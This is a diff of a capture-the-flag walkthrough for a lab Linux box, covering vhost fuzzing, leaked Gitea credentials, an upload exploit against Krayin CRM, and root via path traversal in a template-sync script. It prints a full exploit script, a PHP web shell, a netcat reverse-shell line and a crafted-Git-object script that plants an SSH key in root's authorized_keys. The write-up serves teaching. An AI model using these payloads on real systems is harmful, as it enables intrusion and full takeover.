@@ -3,337 +3,381 @@
 ![alt text](images/logo.png)
 
 **Difficulty:** Easy  
-
 **OS:** Linux
 
-**---**
+---
 
-**## Summary**
+## Summary
 
 1. Enumerate the target
-
 2. Discover the `git.nexus.htb` and `billing.nexus.htb` virtual hosts
-
 3. Find leaked credentials in the public Gitea repository
-
 4. Log in to Krayin CRM and exploit `CVE-2026-38526`
-
 5. Upload a PHP web shell and obtain a reverse shell
-
 6. Recover the `jones` credentials and log in via `SSH`
-
 7. Review the Gitea template synchronization service and identify a path traversal
-
 8. Craft malicious Git objects to write our SSH key into `/root/.ssh/authorized_keys`
-
 9. Gain root access
 
-**---**
+---
 
-**## Solve**
+## Solve
 
-**### Enumeration**
+### Enumeration
 
 Start with a full TCP scan:
 
 ```bash
-
 nmap -sV -sC -p- -A -T5 10.129.99.76
-
 ```
 
 - `-sV` : Detect service versions
-
 - `-sC` : Run default NSE scripts
-
 - `-p-` : Scan all 65535 TCP ports
-
 - `-A` : Enable aggressive detection
-
 - `-T5` : Use the fastest Nmap timing profile
 
 ```text
-
 PORT   STATE SERVICE VERSION
-
 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
-
 80/tcp open  http    nginx 1.24.0 (Ubuntu)
-
 |_http-title: Did not follow redirect to http://nexus.htb/
-
 |_http-server-header: nginx/1.24.0 (Ubuntu)
-
 ```
 
 The interesting services are:
 
 - `22` -> SSH
-
 - `80` -> Web application
 
-According to the first nmap output we will add `nexus.htb` to our /etc/host:
+According to the first nmap output we will add `nexus.htb` to our /etc/host :
 
 ```bash
-
 echo "10.129.99.76 nexus.htb" | sudo tee -a /etc/hosts
-
 ```
 
-**---**
+---
 
-**### Web Enumeration**
+### Web Enumeration
 
-The web application is company app hosting infos, news and an application part. At first look there is not mutch to see on **nexus.htb**. The only information that we can get is two email:
+The web application is company app hosting infos, news and an application part. At first look there is not mutch to see on **nexus.htb**. The only information that we can get is two email :
 
 - j.matthew@nexus.htb
-
 - careers@nexus.htb
 
-The next step would be to fuzz vhost in order to find other application:
+The next step would be to fuzz vhost in order to find other application :
 
 ```bash
-
-ffuf 
-  -u http://10.129.99.76/ 
-  -H 'Host: FUZZ.nexus.htb' 
-  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
-  -mc all 
-  -ac 
+ffuf \
+  -u http://10.129.99.76/ \
+  -H 'Host: FUZZ.nexus.htb' \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -mc all \
+  -ac \
   -t 50
-
 ```
 
-The fuzzing return two news subdomain:
+The fuzzing return two news subdomain :
 
 ```text
-
-git      [Status: 200, Size: 14472, Words: 1195, Lines: 242]
-
-billing  [Status: 302, Size: 390, Words: 60, Lines: 12]
-
+        /'___\  /'___\           /'___\
+       /\ \\__/ /\ \\__/  __  __  /\ \\__/
+       \ \ ,__\\\ \ ,__\\/\ \\/\ \ \ \ ,__\
+        \ \ \\_/ \ \ \\_/\ \ \\_\ \ \ \ \\_/
+         \ \\_\   \ \\_\  \ \\____/  \ \\_\
+          \\/_/    \\/_/   \\/___/    \\/_/
+       2.1.0-dev
+________________________________________________
+ :: Method           : GET
+ :: URL              : http://10.129.99.76/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.nexus.htb
+ :: Follow redirects : false
+ :: Calibration      : true
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: all
+________________________________________________
+git                     [Status: 200, Size: 14472, Words: 1195, Lines: 242, Duration: 35ms]
+billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 90ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 1879 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
 ```
 
-We now need to add both to our `/etc/hosts`:
+We now need to add both to our `/etc/hosts` :
 
 ```bash
-
 echo "10.129.99.76 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
-
 ```
 
-**---**
+---
 
-**### Gitea**
+### Gitea
 
-Accessing to `http://git.nexus.htb` we discover a Gitea application.
+Accessing to `http://git.nexus.htb` we discover a gitea application. If we scroll down we can find version :
 
-If we scroll down we can find the version:
-
-```text
-
+```
 Powered by Gitea
-
-Version: 1.26.0
-
+Version: 1.26.0 Page: 1ms Template: 1ms
 ```
 
-There is also a repository named:
+There is also a repository named : `admin/krayin-docker-setup`.
 
-```text
+Inside this repository there is a file named `.env` that contain every variable used for docker.
 
-admin/krayin-docker-setup
+Inside it we can find a password :
 
 ```
-
-Inside this repository there is a file named `.env` that contains the variables used for Docker.
-
-Inside it we can find a password:
-
-```text
-
 DB_PASSWORD=N27xh!!2ucY04
-
 ```
 
-**---**
+---
 
-**### Krayin**
+### Krayin
 
-If we check `http://billing.nexus.htb` we find an application:
+If we check `http://billing.nexus.htb` we have a application : `Powered by Krayin`
 
-```text
+So far we've got an email and a password. If we use both we can log in to Krayin
 
-Powered by Krayin
+Krayin login :
 
 ```
-
-So far we've got an email and a password.
-
-We can use both to log in to Krayin:
-
-```text
-
 username: j.matthew@nexus.htb
 password: N27xh!!2ucY04
-
 ```
 
-After some research we can see that Krayin is vulnerable to [CVE-2026-38526](https://nvd.nist.gov/vuln/detail/cve-2026-38526).
+After some research we can see that Krayin can be vulnerable to [CVE-2026-38526](https://nvd.nist.gov/vuln/detail/cve-2026-38526).
 
 > An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.
 
-To identify the exact version of Krayin, we can click the profile icon on the top-right of the screen.
-
-The target is running:
-
-```text
-
-Krayin 2.2.0
-
-```
+To identify to exact version of Krayin we can click over the profil icon on top right of the screen to see that it's version 2.2.0 running :
 
 ![alt text](images/image.png)
 
-We can now use the following [PoC](https://www.exploit-db.com/exploits/52629):
+We can now use the following [poc](https://www.exploit-db.com/exploits/52629) :
 
 <details>
+
 <summary><strong>poc.py</strong></summary>
 
 ```python
+
 # Exploit Title: Krayin CRM v2.2.x - Authenticated Remote Code Execution
+
 # Date: 07/05/2026
+
 # Exploit Author: Diamorphine
+
 # Vendor Homepage: https://krayincrm.com
+
 # Software Link: https://github.com/krayin/laravel-crm
+
 # Version: 2.2.x
+
 # Tested on: Debian
+
 # CVE: CVE-2026-38526
 
 import asyncio
+
 import httpx
-from urllib.parse import *
+
+from urllib.parse import \*
+
 import argparse
+
 from bs4 import BeautifulSoup
+
 import json
 
-
 async def main(url, user, password, file):
+
     async with httpx.AsyncClient(verify=False) as client:
+
         url_login = urljoin(url, "/admin/login")
+
         upload_url = urljoin(url, "/admin/tinymce/upload")
 
         get_tokens = await client.get(url=url_login)
+
         soup = BeautifulSoup(get_tokens.text, "html.parser")
+
         _token = soup.find("input").get("value")
 
         login_data = {
+
             "_token": _token,
+
             "email": user,
+
             "password": password
+
         }
 
         login_r = await client.post(url=url_login, data=login_data)
+
         xsrf_token = login_r.cookies.get("XSRF-TOKEN")
 
         headers = {
+
             "X-XSRF-TOKEN": unquote(xsrf_token)
+
         }
 
         with open(file, "rb") as o_file:
+
             r = await client.post(
+
                 url=upload_url,
+
                 files={
+
                     "file": (
+
                         o_file.name,
+
                         o_file,
+
                         "image/jpeg"
+
                     )
+
                 },
+
                 headers=headers
+
             )
 
             if r.status_code == 200:
+
                 exploit_url = r.json().get("location")
+
                 print(
-                    f"[+] File uploaded successfully.n"
+
+                    f"[+] File uploaded successfully.\n"
+
                     f"Path to file: {exploit_url}"
+
                 )
+
             else:
+
                 print("[-] File not uploaded.")
 
-
 parser = argparse.ArgumentParser(
+
     description="Exploit for CVE-2026-38526, authenticated file upload."
+
 )
 
 parser.add_argument(
+
     "-t",
+
     "--target",
+
     required=True,
+
     help="Target url. E.g. http://127.0.0.1"
+
 )
 
 parser.add_argument(
+
     "-u",
+
     "--user",
+
     required=True,
+
     help="Email."
+
 )
 
 parser.add_argument(
+
     "-p",
+
     "--password",
+
     required=True,
+
     help="Password."
+
 )
 
 parser.add_argument(
+
     "-f",
+
     "--file",
+
     required=True,
+
     help="File to upload (/home/user/shell.php)."
+
 )
 
 args = parser.parse_args()
 
 if __name__ == "__main__":
+
     asyncio.run(
+
         main(
+
             args.target,
+
             args.user,
+
             args.password,
+
             args.file
+
         )
+
     )
 ```
 
 </details>
 
 <details>
+
 <summary><strong>shell.php</strong></summary>
 
 ```php
+
 <html>
+
 <body>
 
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+
     <input type="TEXT" name="cmd" id="cmd" size="80">
+
     <input type="SUBMIT" value="Execute">
+
 </form>
 
 <pre>
+
 <?php
+
 if (isset($_GET['cmd'])) {
+
     system($_GET['cmd']);
+
 }
+
 ?>
+
 </pre>
 
 </body>
 
 <script>
+
 document.getElementById("cmd").focus();
+
 </script>
 
 </html>
@@ -341,258 +385,124 @@ document.getElementById("cmd").focus();
 
 </details>
 
-Run the exploit:
-
 ```bash
-
-python3 poc.py 
--t http://billing.nexus.htb 
--u 'j.matthew@nexus.htb' 
--p 'N27xh!!2ucY04' 
--f shell.php
-
-```
-
-Output:
-
-```text
-
+python3 poc.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -f shell.php
 [+] File uploaded successfully.
 Path to file: http://billing.nexus.htb/storage/tinymce/fb73fd7ae2b44825085325355ee415aa.php
-
 ```
 
-From here, using a simple reverse shell, we can gain access to the remote host.
+From here using a simple reverse shell we get access the remote host :
 
-On our host:
+On our host :
 
 ```bash
-
 nc -nlvp 4444
-
 ```
 
-And on the web shell:
+and on the webshell :
 
 ```bash
-
 busybox nc 10.10.14.203 4444 -e sh
-
 ```
 
-We can then upgrade our shell:
+And now in order to upgrade our shell and get a full interactive :
 
 ```bash
-
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-
 CTRL + Z
-
 stty raw -echo && fg
-
 ```
 
-- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Spawns a Bash shell inside a pseudo-terminal.
-
+- `python3 -c 'import pty; pty.spawn("/bin/bash")'` : Spawns a Bash shell inside a pseudo-terminal (PTY).
 - `Ctrl+Z` : Suspends the current reverse shell and sends it to the background.
-
 - `stty raw -echo && fg` : Puts the local terminal in raw mode, disables local echo, and brings the reverse shell back to the foreground.
 
-**---**
+---
 
-**### Pivot**
+### Pivot
 
 From there we can upload [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master) to get more information.
 
-There is one password found using LinPEAS inside:
-
-```text
-
-/var/www/krayin/.env
+There is one password found using linpeas inside : `/var/www/krayin/.env`
 
 ```
-
-```text
-
 DB_DATABASE=krayin
 DB_USERNAME=krayin
 DB_PASSWORD=y27xb3ha!!74GbR
-
 ```
 
-We can also read `/etc/passwd` to identify other users:
+We can also read the `/etc/passwd` to see if there is other user on the target :
 
 ```bash
-
 cat /etc/passwd
-
-```
-
-Relevant users:
-
-```text
-
 git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
 jones:x:1000:1000:,,,:/home/jones:/bin/bash
 root:x:0:0:root:/root:/bin/bash
-
 ```
 
-We can then reuse the recovered credentials to log in as `jones` over SSH.
+We can then use those credentials to log on as **jones** over ssh.
 
-```bash
+---
 
-ssh jones@nexus.htb
+### Privilege Escalation
 
-```
-
-**---**
-
-**### Privilege Escalation**
-
-During the previous enumeration, `linpeas` reports an interesting systemd timer:
+LinPEAS reveals an interesting systemd timer:
 
 ```text
-
-╔══════════╣ System timers (T1053.003)
-
-NEXT                            LEFT LAST                             PASSED UNIT                         ACTIVATES
-Thu 2026-09-10 21:39:09 UTC     19s Thu 2026-09-10 21:38:09 UTC      40s ago gitea-template-sync.timer     gitea-template-sync.service
-
+gitea-template-sync.timer     gitea-template-sync.service
 ```
 
-The interesting timer is:
+The service runs regularly and uses the following script:
 
 ```text
-
-gitea-template-sync.timer
-
+/etc/gitea/template-sync.py
 ```
 
-It runs regularly, so the next step is to inspect the script used by the service:
-
-```bash
-
-cat /etc/gitea/template-sync.py
-
-```
-
-The interesting part is the way paths from the Git repository are handled.
-
-The script first obtains every blob path from:
+Reading the script reveals that file paths returned by `git ls-tree -r HEAD` are joined directly to the template staging directory:
 
 ```python
-
-result = subprocess.run(
-    GIT + ['ls-tree', '-r', 'HEAD'],
-    cwd=bare_path,
-    capture_output=True,
-    text=True,
-    timeout=10
-)
-
-```
-
-The returned path is stored directly in `filepath`:
-
-```python
-
-meta, filepath = parts
-
-if objtype == 'blob':
-    entries.append((mode, objhash, filepath))
-
-```
-
-Later, that untrusted path is appended to the staging directory:
-
-```python
-
 target = os.path.join(stage_path, filepath)
-
 ```
 
-and finally written to disk:
+The resulting path is then written without checking that it still points inside the staging directory:
 
 ```python
-
-os.makedirs(target_dir, exist_ok=True)
-
 with open(target, 'wb') as f:
     f.write(cat_result.stdout)
-
 ```
 
-There is no check to ensure that the final destination remains inside:
+This creates a path traversal vulnerability. A crafted Git tree containing `..` entries can escape:
 
 ```text
-
 /home/git/template-staging/<owner>/<repo>/
-
 ```
 
-Therefore, if a Git tree contains a path such as:
+and write to another location on the filesystem.
 
-```text
+A normal Git working tree does not allow us to create `..` entries, so we need to build the Git objects manually.
 
-../../../../../root/.ssh/authorized_keys
+Log in to Gitea as `jones`, create a repository named `rce`, enable **Make repository a template**, and add a `README.md` file.
 
-```
-
-the filesystem interprets the `..` components when the file is created, allowing the write to escape the staging directory.
-
-A normal Git working tree does not let us simply create files or directories named `..`, so we need to manually create the raw Git objects.
-
-First, log in to Gitea as `jones`.
-
-Create a repository named:
-
-```text
-
-rce
-
-```
-
-Mark it as:
-
-```text
-
-Make repository a template
-
-```
-
-and add a small `README.md`.
-
-Clone the repository locally:
+Clone the repository:
 
 ```bash
-
 git clone http://jones@git.nexus.htb/jones/rce.git
-
 cd rce
-
 ```
 
 Generate an SSH key pair:
 
 ```bash
-
 ssh-keygen -t ed25519 -f /tmp/.k -N ''
-
 ```
 
-This creates:
+The public key is stored in:
 
 ```text
-
-/tmp/.k
 /tmp/.k.pub
-
 ```
 
-The public key will be written into root's `authorized_keys`.
-
-We can now use the following script to manually construct the malicious Git tree:
+Use the following script to create a malicious Git tree that points to `/root/.ssh/authorized_keys`:
 
 <details>
 <summary><strong>poc.py</strong></summary>
@@ -607,9 +517,8 @@ import subprocess
 import sys
 import time
 
-
 def write_obj(data, t):
-    header = ("%s %d" % (t, len(data))).encode() + b"x00"
+    header = ("%s %d" % (t, len(data))).encode() + b"\x00"
     raw = header + data
 
     sha = hashlib.sha1(raw).hexdigest()
@@ -625,19 +534,16 @@ def write_obj(data, t):
 
     return sha
 
-
 def entry(mode, name, sha):
     return (
         ("%s %s" % (mode, name)).encode()
-        + b"x00"
+        + b"\x00"
         + bytes.fromhex(sha)
     )
-
 
 if not os.path.isdir(".git"):
     print("Run inside git repo")
     sys.exit(1)
-
 
 result = subprocess.run(
     ["cat", "/tmp/.k.pub"],
@@ -649,339 +555,196 @@ if result.returncode != 0:
     print("ssh-keygen -t ed25519 -f /tmp/.k -N ''")
     sys.exit(1)
 
+key = result.stdout.strip() + "\n"
 
-key = result.stdout.strip() + "n"
-
+# Blob containing our SSH public key
 blob = write_obj(key.encode(), "blob")
 
-readme = write_obj(
-    b"# Templaten",
-    "blob"
-)
+# Normal README blob
+readme = write_obj(b"# Template\n", "blob")
 
+# Build: root/.ssh/authorized_keys
 ssh_tree = write_obj(
-    entry(
-        "100644",
-        "authorized_keys",
-        blob
-    ),
+    entry("100644", "authorized_keys", blob),
     "tree"
 )
 
 current = write_obj(
-    entry(
-        "40000",
-        ".ssh",
-        ssh_tree
-    ),
+    entry("40000", ".ssh", ssh_tree),
     "tree"
 )
 
 first = write_obj(
-    entry(
-        "40000",
-        "root",
-        current
-    ),
+    entry("40000", "root", current),
     "tree"
 )
 
+# Add four nested ".." tree entries
 for _ in range(4):
     first = write_obj(
-        entry(
-            "40000",
-            "..",
-            first
-        ),
+        entry("40000", "..", first),
         "tree"
     )
 
+# The root tree adds the fifth ".."
+# Final path:
+# ../../../../../root/.ssh/authorized_keys
 root = write_obj(
-    entry(
-        "100644",
-        "README.md",
-        readme
-    )
-    +
-    entry(
-        "40000",
-        "..",
-        first
-    ),
+    entry("100644", "README.md", readme)
+    + entry("40000", "..", first),
     "tree"
 )
 
 timestamp = int(time.time())
 
 commit = (
-    "tree %sn"
-    "author x <x@x> %d +0000n"
-    "committer x <x@x> %d +0000n"
-    "n"
-    "initn"
-) % (
-    root,
-    timestamp,
-    timestamp
-)
+    "tree %s\n"
+    "author x <x@x> %d +0000\n"
+    "committer x <x@x> %d +0000\n"
+    "\n"
+    "init\n"
+) % (root, timestamp, timestamp)
 
-commit_sha = write_obj(
-    commit.encode(),
-    "commit"
-)
+commit_sha = write_obj(commit.encode(), "commit")
 
 os.makedirs(
-    os.path.join(
-        ".git",
-        "refs",
-        "heads"
-    ),
+    os.path.join(".git", "refs", "heads"),
     exist_ok=True
 )
 
 with open(
-    os.path.join(
-        ".git",
-        "refs",
-        "heads",
-        "main"
-    ),
+    os.path.join(".git", "refs", "heads", "main"),
     "w"
 ) as f:
-    f.write(commit_sha + "n")
+    f.write(commit_sha + "\n")
 
 print("Done: " + commit_sha)
 ```
 
 </details>
 
-Run the PoC from inside the cloned repository:
+Run the PoC inside the cloned repository:
 
 ```bash
-
 python3 poc.py
-
 ```
 
-The script manually creates the following malicious path inside the Git tree:
+The crafted tree contains the following traversal path:
 
 ```text
-
 ../../../../../root/.ssh/authorized_keys
-
 ```
 
-It then creates a commit pointing to that tree and updates the local `main` reference.
-
-Push the crafted commit to Gitea:
+Push the malicious commit to Gitea:
 
 ```bash
-
 git push origin main --force
-
 ```
 
-Because the repository is marked as a template, the synchronization timer eventually processes it.
-
-The vulnerable script effectively works with a path equivalent to:
+When the template synchronization service processes the repository, the traversal escapes the staging directory and writes our SSH public key to:
 
 ```text
-
-/home/git/template-staging/jones/rce/
-+
-../../../../../root/.ssh/authorized_keys
-
-```
-
-The `..` components escape the staging directory and reach:
-
-```text
-
 /root/.ssh/authorized_keys
-
 ```
 
-The blob stored at this location contains our `/tmp/.k.pub` public key.
-
-After the synchronization timer has run, connect using the corresponding private key:
+We can now connect as root using the corresponding private key:
 
 ```bash
-
 ssh -i /tmp/.k root@nexus.htb
-
 ```
-
-We now have a root shell.
 
 Finally:
 
 ```bash
-
 cat /root/root.txt
-
 ```
 
-**---**
+---
 
-**## Notes**
+## Notes
 
-**### CVE-2026-38526 - Krayin CRM**
+### CVE-2026-38526
 
-`CVE-2026-38526` is an authenticated unrestricted file upload vulnerability affecting Webkul Krayin CRM 2.2.x.
+`CVE-2026-38526` is an authenticated arbitrary file upload vulnerability affecting Krayin CRM 2.2.x.
 
 The vulnerable endpoint is:
 
 ```text
-
-POST /admin/tinymce/upload
-
+/admin/tinymce/upload
 ```
 
-This endpoint is supposed to handle media uploaded through TinyMCE.
+The endpoint is intended to upload media files for TinyMCE, but dangerous server-side files are not correctly rejected.
 
-However, the application does not correctly validate the uploaded file type.
-
-In our case, we upload:
+The PoC uploads `shell.php` while declaring the file as:
 
 ```text
-
-shell.php
-
-```
-
-while declaring its MIME type as:
-
-```text
-
 image/jpeg
-
 ```
 
-The application accepts the upload and keeps the `.php` extension.
-
-The file is then stored inside a web-accessible directory:
+The application accepts the upload and keeps the `.php` extension. The file is then stored in a web-accessible location such as:
 
 ```text
-
 /storage/tinymce/<random>.php
-
 ```
 
-When we access the uploaded file through HTTP, the web server executes the PHP code.
+When this URL is requested, the server executes the PHP code.
 
-The attack flow is:
+The vulnerability can be summarized as:
 
 ```text
-
 Authenticated user
         ↓
-Upload shell.php
+Upload PHP file
         ↓
-Weak file type validation
+Insufficient file validation
         ↓
-PHP file stored in web directory
-        ↓
-Access the uploaded file
-        ↓
-PHP execution
+PHP stored in a web-accessible directory
         ↓
 Remote Code Execution
-
 ```
 
 The vulnerability is classified as:
 
 ```text
-
 CWE-434 - Unrestricted Upload of File with Dangerous Type
-
 ```
 
-In this box, the CVE is only used to obtain the initial foothold.
+---
 
-It is unrelated to the final privilege escalation.
+### Template Sync Code Review
 
-**---**
-
-**### Code Review - template-sync.py**
-
-The privilege escalation is caused by a custom vulnerability inside:
+The final privilege escalation is not a public Gitea CVE. It comes from the custom script:
 
 ```text
-
 /etc/gitea/template-sync.py
-
 ```
 
-It is not a public Gitea CVE.
+The important part of the review is following the attacker-controlled path from its source to the file write.
 
-A simple way to review the vulnerable code is to follow attacker-controlled data from its source to the dangerous operation.
-
-The source is:
+The path comes from:
 
 ```bash
-
 git ls-tree -r HEAD
-
 ```
 
-The script parses the output and stores the path inside:
+It is stored in `filepath` and directly joined to the staging directory:
 
 ```python
-
-filepath
-
-```
-
-Because we control the Git repository, we also control the value of `filepath`.
-
-The script then performs:
-
-```python
-
 target = os.path.join(stage_path, filepath)
-
 ```
 
-There is no validation to ensure the resulting path stays inside:
+There is no validation to ensure that the final path remains inside `/home/git/template-staging/`.
 
-```text
-
-/home/git/template-staging/
-
-```
-
-For example, there is no use of:
+The resulting path is then used directly by `open()`:
 
 ```python
-
-os.path.realpath()
-os.path.abspath()
-os.path.commonpath()
-
-```
-
-and no explicit rejection of:
-
-```text
-
-..
-
-```
-
-The resulting path is then directly passed to:
-
-```python
-
 with open(target, 'wb') as f:
     f.write(cat_result.stdout)
-
 ```
 
-This gives us the following flow:
+The vulnerable flow is therefore:
 
 ```text
-
 Git repository
       ↓
 git ls-tree
@@ -992,93 +755,19 @@ No path validation
       ↓
 os.path.join()
       ↓
-open(target, "wb")
-      ↓
-Path Traversal
+open()
       ↓
 Arbitrary File Write
-
 ```
 
-The important point is that `os.path.join()` does not sanitize the path.
+`os.path.join()` does not sanitize `..` components. When `open()` accesses the path, the filesystem interprets them and the write can escape the intended directory.
 
-For example:
+Normally Git prevents `..` entries through standard working-tree operations. The PoC therefore manually creates the internal `blob`, `tree`, and `commit` objects inside `.git/objects/`.
 
-```python
-
-os.path.join(
-    "/home/git/template-staging/jones/rce",
-    "../../../../../root/.ssh/authorized_keys"
-)
-
-```
-
-still produces a path containing the traversal components.
-
-When `open()` accesses the path, the operating system interprets the `..` components.
-
-This allows the write to escape the intended staging directory.
-
-Normally, Git prevents us from creating files or directories named:
+This allows us to create:
 
 ```text
-
-..
-
+../../../../../root/.ssh/authorized_keys
 ```
 
-through normal working-tree operations.
-
-For that reason, the exploit manually creates the internal Git objects:
-
-```text
-
-blob
-tree
-commit
-
-```
-
-and writes them directly inside:
-
-```text
-
-.git/objects/
-
-```
-
-This is why the exploit contains functions such as:
-
-```python
-
-write_obj(...)
-entry(...)
-
-```
-
-instead of simply using:
-
-```bash
-
-git add .
-git commit
-
-```
-
-The vulnerability can therefore be summarized as:
-
-```text
-
-Crafted Git Tree
-        ↓
-Path containing ../../../../../
-        ↓
-template-sync.py trusts filepath
-        ↓
-Arbitrary File Write
-        ↓
-/root/.ssh/authorized_keys
-        ↓
-SSH as root
-
-```
+and turn the vulnerable template synchronization service into an arbitrary file write as root.
